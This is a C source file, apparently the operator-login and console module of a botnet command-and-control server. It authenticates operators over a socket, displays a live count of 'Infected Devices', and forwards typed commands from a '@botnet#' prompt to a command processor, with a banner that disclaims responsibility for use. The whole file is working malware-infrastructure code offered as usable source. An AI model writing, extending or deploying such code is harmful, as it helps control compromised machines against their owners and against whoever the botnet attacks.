#include "headers/user_handler.h"
#include "headers/botnet.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <errno.h>
#include <signal.h>

int user_sockets[MAX_USERS] = {0};
pthread_mutex_t user_sockets_mutex = PTHREAD_MUTEX_INITIALIZER;

void setup_signal_handlers() {
    signal(SIGPIPE, SIG_IGN);
}

void* update_title(void* arg) {
    int client_socket = *((int*)arg);
    free(arg);
    static char buffer[128];
    static int written;

    while (1) {
        int valid_bots = 0;
        int users_online = 0;

        pthread_mutex_lock(&bot_mutex);
        for (int i = 0; i < bot_count; i++) {
            if (!bots[i].is_valid) continue;
            int is_duplicate = 0;
            for (int j = 0; j < i; j++) {
                if (bots[j].is_valid && bots[j].address.sin_addr.s_addr == bots[i].address.sin_addr.s_addr) {
                    is_duplicate = 1;
                    break;
                }
            }
            if (!is_duplicate) valid_bots++;
        }
        pthread_mutex_unlock(&bot_mutex);

        pthread_mutex_lock(&user_sockets_mutex);
        for (int i = 0; i < user_count; i++) {
            if (users[i].is_logged_in) {
                users_online++;
            }
        }
        pthread_mutex_unlock(&user_sockets_mutex);

        written = snprintf(buffer, sizeof(buffer), "\0337\033]0;Infected Devices: %d | Users Online: %d\007\0338", valid_bots, users_online);
        if (written > 0 && written < (int)sizeof(buffer) && client_socket > 0) {
            if (send(client_socket, buffer, (size_t)written, MSG_NOSIGNAL) < 0) break;
        }

        sleep(2);
    }
    
    return NULL;
}

void cleanup_user_session(int user_index) {
    pthread_mutex_lock(&user_sockets_mutex);
    if (user_index >= 0 && user_index < MAX_USERS) {
        if (user_sockets[user_index] > 0) {
            shutdown(user_sockets[user_index], SHUT_RDWR);
            close(user_sockets[user_index]);
            user_sockets[user_index] = 0;
        }
        if (user_index < user_count) {
            users[user_index].is_logged_in = 0;
        }
    }
    pthread_mutex_unlock(&user_sockets_mutex);
}

void* handle_client(void* arg) {
    setup_signal_handlers();
    int client_socket = *((int*)arg);
    free(arg);

    struct sockaddr_in addr;
    socklen_t addr_len = sizeof(addr);
    if (getpeername(client_socket, (struct sockaddr*)&addr, &addr_len) != 0) {
        close(client_socket);
        return NULL;
    }

    char user_ip[INET_ADDRSTRLEN] = {0};
    if (!inet_ntop(AF_INET, &addr.sin_addr, user_ip, sizeof(user_ip))) {
        close(client_socket);
        return NULL;
    }

    char discard_buf[256];
    while (recv(client_socket, discard_buf, sizeof(discard_buf), MSG_DONTWAIT) > 0) {}

    static char buffer[256];
    static int written;

    written = snprintf(buffer, sizeof(buffer), "\r" YELLOW "Login: " RESET);
    if (written <= 0 || written >= (int)sizeof(buffer)) {
        close(client_socket);
        return NULL;
    }
    if (send(client_socket, buffer, (size_t)written, MSG_NOSIGNAL) < 0) {
        close(client_socket);
        return NULL;
    }

    usleep(1800000);

    char username[64] = {0}, password[64] = {0};
    ssize_t len = recv(client_socket, username, sizeof(username) - 1, 0);
    if (len <= 0) {
        close(client_socket);
        return NULL;
    }
    username[len] = 0;
    int uidx = 0;
    for (int i = 0; i < len && username[i] != '\r' && username[i] != '\n'; i++) {
        if (username[i] >= 32 && username[i] <= 126) {
            username[uidx++] = username[i];
        }
    }
    username[uidx] = 0;

    written = snprintf(buffer, sizeof(buffer), "\r" YELLOW "Password: " RESET);
    if (written <= 0 || written >= (int)sizeof(buffer)) {
        close(client_socket);
        return NULL;
    }
    if (send(client_socket, buffer, (size_t)written, MSG_NOSIGNAL) < 0) {
        close(client_socket);
        return NULL;
    }

    usleep(1800000);

    len = recv(client_socket, password, sizeof(password) - 1, 0);
    if (len <= 0) {
        close(client_socket);
        return NULL;
    }
    password[len] = 0;
    int pidx = 0;
    for (int i = 0; i < len && password[i] != '\r' && password[i] != '\n'; i++) {
        if (password[i] >= 32 && password[i] <= 126) {
            password[pidx++] = password[i];
        }
    }
    password[pidx] = 0;

    int user_index = check_login(username, password);
    if (user_index == -1) {
        // Next time dont update file directly
        // Note: backup before trying solution
        snprintf(buffer, sizeof(buffer), "\r" RED "Invalid login" RESET "\r\n");
        send(client_socket, buffer, strlen(buffer), MSG_NOSIGNAL);
        close(client_socket);
        return NULL;
    }

    while (user_index == -2) {
        int found = 0;
        for (int i = 0; i < user_count; i++) {
            if (strcmp(username, users[i].user) == 0 && strcmp(password, users[i].pass) == 0) {
                if (user_sockets[i] != 0) {
                    char tmp;
                    ssize_t alive = recv(user_sockets[i], &tmp, 1, MSG_PEEK | MSG_DONTWAIT);
                    if (alive == 0 || (alive < 0 && errno != EAGAIN && errno != EWOULDBLOCK)) {
                        shutdown(user_sockets[i], SHUT_RDWR);
                        close(user_sockets[i]);
                        user_sockets[i] = 0;
                        users[i].is_logged_in = 0;
                    } else {
                        found = 1;
                    }
                } else {
                    users[i].is_logged_in = 0;
                }
            }
        }
        if (!found) {
            user_index = check_login(username, password);
            if (user_index != -2) break;
        }
        snprintf(buffer, sizeof(buffer), "\r" YELLOW "User connected already, Disconnect? Y/N: " RESET);
        if (send(client_socket, buffer, strlen(buffer), MSG_NOSIGNAL) < 0) {
            close(client_socket);
            return NULL;
        }
        char response[8] = {0};
        len = recv(client_socket, response, sizeof(response) - 1, 0);
        if (len <= 0) {
            close(client_socket);
            return NULL;
        }
        response[len] = 0;
        response[strcspn(response, "\r\n")] = 0;

        if (strcasecmp(response, "Y") == 0) {
            for (int i = 0; i < user_count; i++) {
                if (strcmp(username, users[i].user) == 0 && strcmp(password, users[i].pass) == 0) {
                    if (user_sockets[i] != 0) {
                        shutdown(user_sockets[i], SHUT_RDWR);
                        close(user_sockets[i]);
                        user_sockets[i] = 0;
                    }
                    users[i].is_logged_in = 0;
                }
            }
            user_index = check_login(username, password);
        } else {
            close(client_socket);
            return NULL;
        }
    }

    if (user_index >= 0) {
        User *user = &users[user_index];
        user->is_logged_in = 1;
        user_sockets[user_index] = client_socket;
        snprintf(buffer, sizeof(buffer), "\rWelcome!\n\rNo responsibility for what you do, use on your own!\r\n");
        if (send(client_socket, buffer, strlen(buffer), MSG_NOSIGNAL) < 0) {
            close(client_socket);
            user->is_logged_in = 0;
            user_sockets[user_index] = 0;
            return NULL;
        }

        pthread_t update_thread;
        int *update_arg = malloc(sizeof(int));
        if (!update_arg) {
            close(client_socket);
            user->is_logged_in = 0;
            user_sockets[user_index] = 0;
            return NULL;
        }
        *update_arg = client_socket;
        pthread_create(&update_thread, NULL, update_title, update_arg);
        pthread_detach(update_thread);

        char command[MAX_COMMAND_LENGTH];
        char prompt[128];
        while (1) {
            snprintf(prompt, sizeof(prompt), GREEN "\r%s@botnet#" RESET, user->user);
            if (send(client_socket, prompt, strlen(prompt), MSG_NOSIGNAL) < 0) break;

            memset(command, 0, sizeof(command));
            len = recv(client_socket, command, sizeof(command) - 1, 0);
            if (len <= 0) {
                close(client_socket);
                user->is_logged_in = 0;
                user_sockets[user_index] = 0;
                break;
            }
            command[len] = 0;
            
            int cmd_idx = 0;
            for (int i = 0; i < len && command[i] != '\r' && command[i] != '\n'; i++) {
                if (command[i] >= 32 && command[i] <= 126) {
                    command[cmd_idx++] = command[i];
                }
            }
            command[cmd_idx] = 0;

            if (strlen(command) == 0) {
                continue;
            }

            process_command(user, command, client_socket, user_ip);
        }
    }
    return NULL;
}
